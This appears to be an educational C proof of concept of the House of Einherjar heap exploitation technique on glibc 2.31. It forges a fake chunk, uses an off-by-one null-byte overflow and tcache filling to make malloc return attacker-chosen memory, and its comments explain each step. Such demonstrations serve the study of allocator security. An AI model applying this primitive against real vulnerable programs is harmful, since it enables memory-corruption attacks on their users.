
#include <stdlib.h>
#include <stdint.h>
#include <malloc.h>
#include <assert.h>
int main()
{
    /*
     * This modification to The House of Enherjar, made by Huascar Tejeda - @htejeda, works with the tcache-option enabled on glibc-2.31.
     * The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc().
     * It has the additional requirement of a heap leak.
     *
     * After filling the tcache list to bypass the restriction of consolidating with a fake chunk,
     * we target the unsorted bin (instead of the small bin) by creating the fake chunk in the heap.
     * The following restriction for normal bins won't allow us to create chunks bigger than the memory
     * allocated from the system in this arena:
     *
     * https://sourceware.org/git/?p=glibc.git;a=commit;f=malloc/malloc.c;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c */
    intptr_t *fake_chunk = malloc(0x38);
    // create a fake chunk
    fake_chunk[0] = 0;    // prev_size (Not Used)
    fake_chunk[1] = 0x60; // size
    fake_chunk[2] = (size_t)fake_chunk; // fwd
    fake_chunk[3] = (size_t)fake_chunk; // bck
    uint8_t *controlled_chunk = (uint8_t *)malloc(0x28);
    int real_b_size = malloc_usable_size(controlled_chunk);
    /* In this case it is easier if the chunk size attribute has a least significant byte with
     * a value of 0x00. The least significant byte of this will be 0x00, because the size of
     * the chunk includes the amount requested plus some amount required for the metadata. */
    uint8_t *overflowed_chunk = (uint8_t *)malloc(0xf8);
    uint64_t *c_size_ptr = (uint64_t *)(overflowed_chunk - 8);
    // This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit
    controlled_chunk[real_b_size] = 0;
    // Write a fake prev_size to the end of controlled_chunk
    size_t fake_size = (size_t)((overflowed_chunk - sizeof(size_t) * 2) - (uint8_t *)fake_chunk);
    *(size_t *)&controlled_chunk[real_b_size - sizeof(size_t)] = fake_size;
    // Change the fake chunk's size to reflect overflowed_chunk's new prev_size
    fake_chunk[1] = fake_size;
    // Now we fill the tcache before we free chunk 'overflowed_chunk' to consolidate with our fake chunk
    intptr_t *x[7];
    for (int i = 0; i < sizeof(x) / sizeof(intptr_t *); i++) {
        x[i] = malloc(0xf8);
    }
    for (int i = 0; i < sizeof(x) / sizeof(intptr_t *); i++) {
        free(x[i]);
    }
    free(overflowed_chunk);
    intptr_t *new_chunk = malloc(0x158);
    assert((void *)new_chunk == (void *)fake_chunk + 0x10);
}
